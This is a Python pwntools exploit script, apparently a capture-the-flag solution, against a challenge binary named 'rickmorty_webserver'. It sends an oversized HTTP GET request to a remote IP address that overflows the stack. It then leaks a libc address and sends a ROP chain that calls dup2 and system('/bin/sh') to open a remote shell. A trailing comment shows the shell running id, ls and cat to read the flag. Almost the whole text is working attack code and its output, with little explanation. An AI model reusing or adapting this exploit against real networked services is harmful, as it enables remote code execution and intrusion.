#!/usr/bin/env python
from pwn import *
from time import sleep

b = ELF('./rickmorty_webserver')
l = ELF('./libc-2.24.so')

#context.log_level = 'debug'
local = False

if local:
	r = remote('localhost', 99)
else:
	r = remote('188.165.211.36', 1002)

bss = 0x804a88c
pop_ebp = 0x08048f18
leave_ret = 0x08048aec
popret = 0x080486b1
pop2ret = 0x08048f17

stager  = ''
stager += p32(b.symbols['send_string'])  # |
stager += p32(pop2ret)                   # |
stager += p32(0x4)                       # |
stager += p32(b.got['recv'])             #  -> Leak recv@got using send_string
stager += p32(b.symbols['recv_line'])    # |
stager += p32(pop2ret)                   # |
stager += p32(0x4)                       # |
stager += p32(bss)                       #  -> Read from stdin in bss using recv_line
stager += p32(pop_ebp)                   # |
stager += p32(bss)                       # |
stager += p32(leave_ret) 		 #  -> stack shifting 

payload  = ''
payload += 'GET /index.html HTTP/1.1'
payload += 'A' * (540 - len(payload))
payload += stager
payload += '\r\n\r\n'

log.info('Sending stager')
r.sendline(payload)

log.info('Leaking Libc')
recv_libc = u32(r.recv()[:4])
log.success('Recv @ libc: {:#x}'.format(recv_libc))

base_libc = recv_libc - l.symbols['recv']
log.info('Libc: {:#x}'.format(base_libc))

rop_chain  = ''
rop_chain += 'C' * 3
rop_chain += p32(base_libc + l.symbols['dup2'])   # |
rop_chain += p32(pop2ret)                         # |
rop_chain += p32(0x4)                             # |
rop_chain += p32(0x0)                             #  -> Redirect stdin from socket's descriptor
rop_chain += p32(base_libc + l.symbols['dup2'])   # |
rop_chain += p32(pop2ret)                         # |
rop_chain += p32(0x4)                             # |
rop_chain += p32(0x1)                             #  -> Redirect stdout from socket's descriptor
rop_chain += p32(base_libc + l.symbols['system']) # |
rop_chain += p32(base_libc + l.symbols['exit'])   # |
rop_chain += p32(base_libc + 0x15cd48)            #  -> Execute /bin/sh
rop_chain += '\r\n\r\n'

sleep(1)

log.info('Sending ROP chain')
r.send(rop_chain)
r.interactive()

'''
[*] 'rickmorty_webserver'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] 'libc-2.24.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 188.165.211.36 on port 1002: Done
[*] Sending stager
[*] Leaking Libc
[+] Recv @ libc: 0xf764cc60
[*] Libc: 0xf7564000
[*] Sending ROP chain
[*] Switching to interactive mode
$ id
uid=1001(rick) gid=1001(rick) grupos=1001(rick)
$ ls -l
total 20
-rw-r----- 1 root rick    33 oct  2 12:12 f14g
-r-x------ 1 root root 10952 oct  5 19:43 webserver
drwxr-x--- 3 root rick  4096 oct  5 00:52 www
$ cat f14g
nn7ed{0ld_$t4ck_0v3rfl0ws_FTW#!}
'''
